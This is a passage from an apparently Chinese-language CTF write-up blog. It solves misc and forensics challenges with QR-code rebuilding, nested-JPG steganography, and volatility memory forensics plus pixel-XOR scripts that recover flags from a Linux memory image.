</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>draw_qrcode</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,</span> <span class=p>(</span><span class=mi>59</span><span class=p>,</span> <span class=mi>59</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=mi>59</span><span class=p>,</span><span class=mi>59</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>i</span> <span class=o>%</span> <span class=n>w</span>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=n>i</span> <span class=o>//</span> <span class=n>w</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>resized_img</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>resize</span><span class=p>((</span><span class=mi>590</span><span class=p>,</span> <span class=mi>590</span><span class=p>),</span> <span class=n>Image</span><span class=o>.</span><span class=n>NEAREST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># resized_img.show()</span>
</span></span><span class=line><span class=cl>    <span class=n>resized_img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;qrcode.png&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>root_dir</span> <span class=o>=</span> <span class=s1>&#39;./&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>contents</span> <span class=o>=</span> <span class=n>extract_file_contents</span><span class=p>(</span><span class=n>root_dir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>contents</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>draw_qrcode</span><span class=p>(</span><span class=n>contents</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Welcome, Key: 2339649336ce442c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824182241025.png alt=/posts/bb1da35/imgs/image-20250824182241025.png height=982 width=1636></p><p>扫码得到：<code>Welcome, Key: 2339649336ce442c</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824182330161.png alt=/posts/bb1da35/imgs/image-20250824182330161.png height=1756 width=2804></p><p>回头去看提取出来的rar，发现末尾还有一个加密的zip压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250824182426296.png alt=/posts/bb1da35/imgs/image-20250824182426296.png height=1836 width=2810></p><p>提取出来，然后输入之前得到的密码解压即可得到最后的flag：<code>flag{b9c8ab267048488298648cc3793fc498}</code></p><h2 class=heading-element id=题目名称-pic2><span>题目名称 PIC2</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-pic2 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个伪加密的zip压缩包，去除伪加密后得到一张jpg</p><p>010打开发现末尾藏了一张jpg，并且中间还有一串字符</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250825161100104.png alt=/posts/bb1da35/imgs/image-20250825161100104.png height=1836 width=2810></p><p>把jpg和中间的字符提取出来，发现这张jpg也和之前的一样藏了jpg和一些字符</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250825161203451.png alt=/posts/bb1da35/imgs/image-20250825161203451.png height=1836 width=2810></p><p>我们按照规律依此提取</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250825161413138.png alt=/posts/bb1da35/imgs/image-20250825161413138.png height=1836 width=2810></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250825161431083.png alt=/posts/bb1da35/imgs/image-20250825161431083.png height=1836 width=2810></p><p>最后将提取出来的字符base32解码即可得到flag：<code>KEY{b26259f93cbb178944034b7e367c6fa5}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250825161519274.png alt=/posts/bb1da35/imgs/image-20250825161519274.png height=1754 width=2804></p><h2 class=heading-element id=题目名称-flaggalf><span>题目名称 flag^galf</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-flaggalf class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个Ubuntu flag.lime内存镜像</p><p>拿到内存镜像，先用R-studio扫一下，发现没有扫到什么特别的信息</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828100619466.png alt=/posts/bb1da35/imgs/image-20250828100619466.png height=1652 width=2790></p><p>然后我们拿010打开内存镜像，尝试搜索几个常见的关键字，并用肉眼去扫一遍</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828100828915.png alt=/posts/bb1da35/imgs/image-20250828100828915.png height=1836 width=2810></p><p>发现出题人用enc.py去加密了一张图片，并且下面的定时任务也提示了我们用的可能是异或的方法</p><p>至此我们大概就知道出题人的意图了，因此我们需要尝试从内存镜像中提取出这几张图片和加密脚本</p><p>这个需要我们去制作vol2的Profile，然后去进行内存取证（vol3没办法导出文件）</p><p>如何制作vol2的Profile可以参考我的这篇博客：<a href=https://goodlunatic.github.io/posts/761da51/ target=_blank rel="external nofollow noopener noreferrer">Misc-Forensics</a></p><p>做好Profile后，打包为zip放到<code>volatility/volatility/plugins/overlays/linux</code>即可</p><p>然后运行<code>python2 volatility/vol.py --info</code>，发现可以正常加载Profile</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828101336228.png alt=/posts/bb1da35/imgs/image-20250828101336228.png height=1344 width=2390></p><p>我们首先看一下命令行中的历史记录，可以看到出题人加密图片的命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_bash &gt; linux_bash.txt</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828101607699.png alt=/posts/bb1da35/imgs/image-20250828101607699.png height=1836 width=2810></p><p>然后尝试查找并导出这几张加密图片和脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -L <span class=p>|</span> grep <span class=s2>&#34;enc.py&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -i 0xffff8de7b8c92b18 -O ./enc.py
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -L <span class=p>|</span> grep <span class=s2>&#34;picture.png&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -i 0xffff8de7b8dab388 -O ./picture.png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -L <span class=p>|</span> grep <span class=s2>&#34;encrypt.png&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile<span class=o>=</span>LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -i 0xffff8de7b8daf708 -O ./encrypt.png</span></span></code></pre></td></tr></table></div></div><p>发现enc.py导出来是空的并且内存中找不到ori.png，但是picture.png和encrypt.png可以正常导出</p><p>因此结合之前在定时任务中得到的提示，猜测出题人是要我们去分析这个图片异或加密算法了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828102814331.png alt=/posts/bb1da35/imgs/image-20250828102814331.png height=1112 width=2672></p><p>先尝试写了一个脚本，直接把两张图片的像素异或一下，发现能看到flag的影子，但是不清晰</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;encrypt.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img2</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;picture.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>w</span><span class=p>,</span><span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r1</span><span class=p>,</span><span class=n>g1</span><span class=p>,</span><span class=n>b1</span><span class=p>,</span><span class=n>a1</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span><span class=p>,</span><span class=n>g2</span><span class=p>,</span><span class=n>b2</span><span class=p>,</span><span class=n>a2</span> <span class=o>=</span> <span class=n>img2</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>r1</span> <span class=o>^</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>            <span class=n>g</span> <span class=o>=</span> <span class=n>g1</span> <span class=o>^</span> <span class=n>g2</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=n>b1</span> <span class=o>^</span> <span class=n>b2</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=n>a1</span> <span class=o>^</span> <span class=n>a2</span>
</span></span><span class=line><span class=cl>            <span class=n>img3</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>),(</span><span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>    <span class=n>img3</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;img3.png&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828103341050.png alt=/posts/bb1da35/imgs/image-20250828103341050.png height=1836 width=2804></p><p>因此，尝试去分析了一下像素的规律，然后发现有部分连续像素点的rgba的异或结果相同</p><p>然后尝试缩小了一下异或结果res的范围，发现<code>res>=255</code>的时候（其实就是<code>res==255</code>的时候）</p><p>可以得到清晰的flag图像</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img1_pixles</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img2_pixles</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>xor_pixles</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;encrypt.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img2</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;picture.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>w</span><span class=p>,</span><span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r1</span><span class=p>,</span><span class=n>g1</span><span class=p>,</span><span class=n>b1</span><span class=p>,</span><span class=n>a1</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span><span class=p>,</span><span class=n>g2</span><span class=p>,</span><span class=n>b2</span><span class=p>,</span><span class=n>a2</span> <span class=o>=</span> <span class=n>img2</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>r1</span> <span class=o>^</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>            <span class=n>g</span> <span class=o>=</span> <span class=n>g1</span> <span class=o>^</span> <span class=n>g2</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=n>b1</span> <span class=o>^</span> <span class=n>b2</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=n>a1</span> <span class=o>^</span> <span class=n>a2</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>r</span> <span class=o>^</span> <span class=n>g</span> <span class=o>^</span> <span class=n>b</span> <span class=o>^</span> <span class=n>a</span> <span class=c1># 发现部分连续像素异或出来的结果相同</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>img1_pixles</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=nb>bin</span><span class=p>(</span><span class=n>r1</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>g1</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>b1</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>a1</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span><span class=p>,</span><span class=n>g2</span><span class=p>,</span><span class=n>b2</span><span class=p>,</span><span class=n>a2</span> <span class=o>=</span> <span class=n>img2</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>img2_pixles</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=nb>bin</span><span class=p>(</span><span class=n>r2</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>g2</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>b2</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>a2</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            <span class=n>xor_pixles</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=nb>bin</span><span class=p>(</span><span class=n>r</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>g</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>b</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=nb>bin</span><span class=p>(</span><span class=n>a</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>res</span> <span class=o>&gt;=</span> <span class=mi>255</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>img3</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>),(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>img3</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>),(</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>img1_pixles</span><span class=p>[:</span><span class=mi>10</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>img2_pixles</span><span class=p>[:</span><span class=mi>10</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>xor_pixles</span><span class=p>[:</span><span class=mi>10</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;flag.png&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828103832643.png alt=/posts/bb1da35/imgs/image-20250828103832643.png height=1068 width=1762></p><p>当然以上只是我一开始的解题思路，后来回头联想了一下题目的名称 <code>flag ^ galf</code></p><p>想到出题人的真实意图应该是img1的rgba异或img2的abgr</p><p>因此写了个脚本，复原出了出题人的ori.png，得到本题的flag: <code>DASCTF{9da98cbf7e99bff7c93ef066935f65ba}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;encrypt.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img2</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;picture.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGBA&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>w</span><span class=p>,</span><span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r1</span><span class=p>,</span><span class=n>g1</span><span class=p>,</span><span class=n>b1</span><span class=p>,</span><span class=n>a1</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span><span class=p>,</span><span class=n>g2</span><span class=p>,</span><span class=n>b2</span><span class=p>,</span><span class=n>a2</span> <span class=o>=</span> <span class=n>img2</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>r1</span> <span class=o>^</span> <span class=n>a2</span>
</span></span><span class=line><span class=cl>            <span class=n>g</span> <span class=o>=</span> <span class=n>g1</span> <span class=o>^</span> <span class=n>b2</span>
